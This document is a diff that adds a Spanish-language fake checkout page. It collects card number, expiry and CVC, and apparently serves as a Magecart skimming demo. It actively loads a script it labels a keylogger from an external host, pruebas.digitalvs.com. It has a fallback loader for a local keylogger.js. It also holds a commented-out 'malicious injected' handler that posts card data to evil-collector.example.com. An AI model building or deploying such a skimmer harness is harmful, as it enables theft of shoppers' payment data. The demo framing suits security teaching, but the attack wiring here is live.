@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <!-- <script
+      src="https://us.gimp.zeronaught.com/__imp_apg__/js/volt-accessq_nfr_unwtrrga-b5e67bf4.js"
+      id="_imp_apg_dip_"
+      _imp_apg_cid_="volt-accessq_nfr_unwtrrga-b5e67bf4"
+      _imp_apg_api_domain_="https://us.gimp.zeronaught.com"
+    ></script> -->
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TechStore Pro - Secure Checkout</title>
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+
+      .checkout-container {
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(20px);
+        border-radius: 24px;
+        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+        overflow: hidden;
+        max-width: 800px;
+        width: 100%;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        min-height: 600px;
+      }
+
+      .order-summary {
+        background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+        color: white;
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+      }
+
+      .order-summary h2 {
+        font-size: 28px;
+        margin-bottom: 30px;
+        font-weight: 300;
+      }
+
+      .product-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 15px 0;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+      }
+
+      .product-item:last-child {
+        border-bottom: none;
+        font-weight: bold;
+        font-size: 18px;
+        padding-top: 20px;
+        margin-top: 20px;
+        border-top: 2px solid rgba(255, 255, 255, 0.3);
+      }
+
+      .product-name {
+        display: flex;
+        align-items: center;
+      }
+
+      .product-name i {
+        margin-right: 10px;
+        font-size: 20px;
+      }
+
+      .product-price {
+        font-weight: bold;
+        color: #f1c40f;
+      }
+
+      .payment-section {
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+      }
+
+      .payment-header {
+        text-align: center;
+        margin-bottom: 40px;
+      }
+
+      .payment-header h1 {
+        color: #2c3e50;
+        font-size: 32px;
+        font-weight: 300;
+        margin-bottom: 10px;
+      }
+
+      .payment-header p {
+        color: #7f8c8d;
+        font-size: 16px;
+      }
+
+      .form-group {
+        margin-bottom: 25px;
+        position: relative;
+      }
+
+      .form-group label {
+        display: block;
+        margin-bottom: 8px;
+        color: #2c3e50;
+        font-weight: 500;
+        font-size: 14px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+
+      .input-container {
+        position: relative;
+      }
+
+      .form-control {
+        width: 100%;
+        padding: 16px 20px;
+        border: 2px solid #ecf0f1;
+        border-radius: 12px;
+        font-size: 16px;
+        transition: all 0.3s ease;
+        background: #fafbfc;
+      }
+
+      .form-control:focus {
+        outline: none;
+        border-color: #3498db;
+        background: white;
+        box-shadow: 0 0 0 4px rgba(52, 152, 219, 0.1);
+        transform: translateY(-2px);
+      }
+
+      .input-icon {
+        position: absolute;
+        right: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #bdc3c7;
+        font-size: 18px;
+      }
+
+      .form-row {
+        display: grid;
+        grid-template-columns: 2fr 1fr;
+        gap: 20px;
+      }
+
+      .card-brands {
+        display: flex;
+        gap: 10px;
+        margin-top: 10px;
+        align-items: center;
+      }
+
+      .card-brand {
+        padding: 6px 12px;
+        background: #ecf0f1;
+        border-radius: 6px;
+        font-size: 12px;
+        font-weight: bold;
+        color: #7f8c8d;
+        transition: all 0.3s ease;
+      }
+
+      .card-brand.active {
+        background: #3498db;
+        color: white;
+      }
+
+      .submit-btn {
+        background: linear-gradient(135deg, #3498db, #2980b9);
+        color: white;
+        border: none;
+        padding: 18px 40px;
+        border-radius: 50px;
+        font-size: 18px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        width: 100%;
+        margin-top: 20px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .submit-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 15px 35px rgba(52, 152, 219, 0.4);
+      }
+
+      .submit-btn:active {
+        transform: translateY(-1px);
+      }
+
+      .security-info {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 20px;
+        color: #27ae60;
+        font-size: 14px;
+      }
+
+      .security-info i {
+        margin-right: 8px;
+        font-size: 16px;
+      }
+
+      .loading {
+        display: none;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+      }
+
+      .spinner {
+        width: 20px;
+        height: 20px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: white;
+        animation: spin 1s ease-in-out infinite;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .floating-elements {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        overflow: hidden;
+      }
+
+      .floating-element {
+        position: absolute;
+        width: 60px;
+        height: 60px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 50%;
+        animation: float 6s ease-in-out infinite;
+      }
+
+      .floating-element:nth-child(1) {
+        top: 10%;
+        left: 10%;
+        animation-delay: 0s;
+      }
+      .floating-element:nth-child(2) {
+        top: 20%;
+        right: 10%;
+        animation-delay: 1s;
+      }
+      .floating-element:nth-child(3) {
+        bottom: 20%;
+        left: 15%;
+        animation-delay: 2s;
+      }
+      .floating-element:nth-child(4) {
+        bottom: 10%;
+        right: 20%;
+        animation-delay: 3s;
+      }
+
+      @keyframes float {
+        0%,
+        100% {
+          transform: translateY(0px) rotate(0deg);
+        }
+        50% {
+          transform: translateY(-20px) rotate(180deg);
+        }
+      }
+
+      @media (max-width: 768px) {
+        .checkout-container {
+          grid-template-columns: 1fr;
+          max-width: 500px;
+        }
+
+        .order-summary {
+          order: 2;
+          padding: 30px;
+        }
+
+        .payment-section {
+          padding: 30px;
+        }
+
+        .form-row {
+          grid-template-columns: 1fr;
+        }
+      }
+
+      /* Animaciones de entrada */
+      .fade-in {
+        animation: fadeIn 0.8s ease-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(30px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="floating-elements">
+      <div class="floating-element"></div>
+      <div class="floating-element"></div>
+      <div class="floating-element"></div>
+      <div class="floating-element"></div>
+    </div>
+
+    <div class="checkout-container fade-in">
+      <div class="order-summary">
+        <div>
+          <h2><i class="fas fa-shopping-cart"></i> Tu Pedido</h2>
+
+          <div class="product-item">
+            <div class="product-name">
+              <i class="fas fa-laptop"></i>
+              <span>MacBook Pro 16" M3</span>
+            </div>
+            <div class="product-price">$2,499.00</div>
+          </div>
+
+          <div class="product-item">
+            <div class="product-name">
+              <i class="fas fa-mouse"></i>
+              <span>Magic Mouse</span>
+            </div>
+            <div class="product-price">$79.00</div>
+          </div>
+
+          <div class="product-item">
+            <div class="product-name">
+              <i class="fas fa-shipping-fast"></i>
+              <span>Envío Express</span>
+            </div>
+            <div class="product-price">$19.99</div>
+          </div>
+
+          <div class="product-item">
+            <div class="product-name">
+              <i class="fas fa-receipt"></i>
+              <span>Total a Pagar</span>
+            </div>
+            <div class="product-price">$2,597.99</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="payment-section">
+        <div class="payment-header">
+          <h1><i class="fas fa-credit-card"></i> Pago Seguro</h1>
+          <p>Completa tu compra de forma segura</p>
+        </div>
+
+        <form id="payment-form">
+          <div class="form-group">
+            <label for="cc_number">
+              <i class="fas fa-credit-card"></i> Número de Tarjeta
+            </label>
+            <div class="input-container">
+              <input
+                type="text"
+                id="cc_number"
+                name="cc_number"
+                class="form-control"
+                placeholder="1234 5678 9012 3456"
+                maxlength="19"
+                required
+              />
+              <i class="fas fa-credit-card input-icon"></i>
+            </div>
+            <div class="card-brands">
+              <span class="card-brand">VISA</span>
+              <span class="card-brand">MASTERCARD</span>
+              <span class="card-brand">AMEX</span>
+              <span class="card-brand">DISCOVER</span>
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="cc_exp">
+                <i class="fas fa-calendar-alt"></i> Fecha de Expiración
+              </label>
+              <div class="input-container">
+                <input
+                  type="text"
+                  id="cc_exp"
+                  name="cc_exp"
+                  class="form-control"
+                  placeholder="MM/AA"
+                  maxlength="5"
+                  required
+                />
+                <i class="fas fa-calendar-alt input-icon"></i>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label for="cc_cvc"> <i class="fas fa-lock"></i> CVC </label>
+              <div class="input-container">
+                <input
+                  type="text"
+                  id="cc_cvc"
+                  name="cc_cvc"
+                  class="form-control"
+                  placeholder="123"
+                  maxlength="4"
+                  required
+                />
+                <i class="fas fa-lock input-icon"></i>
+              </div>
+            </div>
+          </div>
+
+          <button type="submit" class="submit-btn">
+            <span class="btn-text">
+              <i class="fas fa-shield-alt"></i>
+              Procesar Pago - $2,597.99
+            </span>
+            <div class="loading">
+              <div class="spinner"></div>
+            </div>
+          </button>
+
+          <div class="security-info">
+            <i class="fas fa-shield-alt"></i>
+            Protegido con encriptación SSL de 256 bits
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      // Formateo automático de campos
+      document.addEventListener("DOMContentLoaded", function () {
+        const ccNumber = document.getElementById("cc_number");
+        const ccExp = document.getElementById("cc_exp");
+        const ccCvc = document.getElementById("cc_cvc");
+        const form = document.getElementById("payment-form");
+        const submitBtn = document.querySelector(".submit-btn");
+
+        // Formatear número de tarjeta
+        ccNumber.addEventListener("input", function (e) {
+          let value = e.target.value.replace(/\s/g, "").replace(/[^0-9]/gi, "");
+          let formattedValue = value.match(/.{1,4}/g)?.join(" ") || value;
+          e.target.value = formattedValue;
+
+          // Detectar tipo de tarjeta
+          detectCardType(value);
+        });
+
+        // Formatear fecha de expiración
+        ccExp.addEventListener("input", function (e) {
+          let value = e.target.value.replace(/\D/g, "");
+          if (value.length >= 2) {
+            value = value.substring(0, 2) + "/" + value.substring(2, 4);
+          }
+          e.target.value = value;
+        });
+
+        // Solo números en CVC
+        ccCvc.addEventListener("input", function (e) {
+          e.target.value = e.target.value.replace(/[^0-9]/g, "");
+        });
+
+        // Detectar tipo de tarjeta
+        function detectCardType(number) {
+          const brands = document.querySelectorAll(".card-brand");
+          brands.forEach((brand) => brand.classList.remove("active"));
+
+          if (number.startsWith("4")) {
+            document.querySelector(".card-brand").classList.add("active");
+          } else if (number.startsWith("5") || number.startsWith("2")) {
+            document.querySelectorAll(".card-brand")[1].classList.add("active");
+          } else if (number.startsWith("3")) {
+            document.querySelectorAll(".card-brand")[2].classList.add("active");
+          } else if (number.startsWith("6")) {
+            document.querySelectorAll(".card-brand")[3].classList.add("active");
+          }
+        }
+
+        // Manejar envío del formulario
+        form.addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          // Mostrar loading
+          const btnText = submitBtn.querySelector(".btn-text");
+          const loading = submitBtn.querySelector(".loading");
+
+          btnText.style.opacity = "0";
+          loading.style.display = "block";
+          submitBtn.disabled = true;
+
+          // Simular procesamiento
+          setTimeout(() => {
+            btnText.style.opacity = "1";
+            loading.style.display = "none";
+            submitBtn.disabled = false;
+
+            // Mostrar mensaje de éxito
+            alert(
+              "🎉 ¡Pago procesado exitosamente!\n\n" +
+                "Esta es una simulación educativa.\n" +
+                "Transacción ID: " +
+                Math.random().toString(36).substr(2, 9).toUpperCase()
+            );
+          }, 2000);
+
+          // Log de datos (para demo/testing)
+          const formData = new FormData(form);
+          const data = {};
+          for (let [key, value] of formData.entries()) {
+            data[key] = value;
+          }
+          console.log("💳 Datos de pago capturados:", data);
+        });
+
+        // Efectos de foco en inputs
+        const inputs = document.querySelectorAll(".form-control");
+        inputs.forEach((input) => {
+          input.addEventListener("focus", function () {
+            this.parentElement.style.transform = "scale(1.02)";
+          });
+
+          input.addEventListener("blur", function () {
+            this.parentElement.style.transform = "scale(1)";
+          });
+        });
+
+        // Debug: Verificar que los campos existen
+        console.log("📋 Campos del formulario encontrados:");
+        console.log(
+          "- cc_number:",
+          document.getElementById("cc_number") ? "✅" : "❌"
+        );
+        console.log(
+          "- cc_exp:",
+          document.getElementById("cc_exp") ? "✅" : "❌"
+        );
+        console.log(
+          "- cc_cvc:",
+          document.getElementById("cc_cvc") ? "✅" : "❌"
+        );
+        console.log("🔄 Esperando carga del keylogger externo...");
+      });
+
+      /*// Malicious injected JavaScript – captures user form data
+        document
+          .getElementById("payment-form")
+          .addEventListener("submit", function (e) {
+            e.preventDefault();
+            const formData = {};
+            for (let el of this.elements) {
+              if (el.name) formData[el.name] = el.value;
+            }
+            // Exfiltration – sends card data to attacker's server
+            fetch("https://evil-collector.example.com/steal", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(formData),
+            });
+          });*/
+    </script>
+
+    <!-- Keylogger externo - se carga al final para asegurar que el DOM esté listo 
+     src="https://raw.githubusercontent.com/ocpdata/magecart/refs/heads/main/jquery.js"
+     src="https://pruebas.digitalvs.com:4010/magecart/jquery.js"-->
+    <script
+      src="https://pruebas.digitalvs.com:4010/magecart/jquery.js"
+      onload="console.log('✅ Keylogger externo cargado exitosamente')"
+      onerror="console.error('❌ Error al cargar keylogger externo')"
+    ></script>
+
+    <script>
+      // Verificar después de 2 segundos si el keylogger se inicializó
+      setTimeout(() => {
+        const keyloggerPanel = document.getElementById("keylogger-panel");
+        if (keyloggerPanel) {
+          console.log("✅ Panel del keylogger encontrado y activo");
+        } else {
+          console.error("❌ Panel del keylogger NO encontrado");
+          console.log(
+            "🔧 Cargando keylogger de respaldo desde archivo externo..."
+          );
+          loadBackupKeylogger();
+        }
+      }, 2000);
+
+      // Cargar keylogger de respaldo desde archivo externo
+      function loadBackupKeylogger() {
+        const backupScript = document.createElement("script");
+        backupScript.src = "./keylogger.js";
+        backupScript.onload = function () {
+          console.log("✅ Keylogger de respaldo cargado desde archivo externo");
+        };
+        backupScript.onerror = function () {
+          console.error(
+            "❌ Error al cargar keylogger de respaldo desde archivo externo"
+          );
+          console.log(
+            "🚨 Ambos keyloggers fallaron - sin monitoreo disponible"
+          );
+        };
+        document.head.appendChild(backupScript);
+      }
+    </script>
+  </body>
+</html>
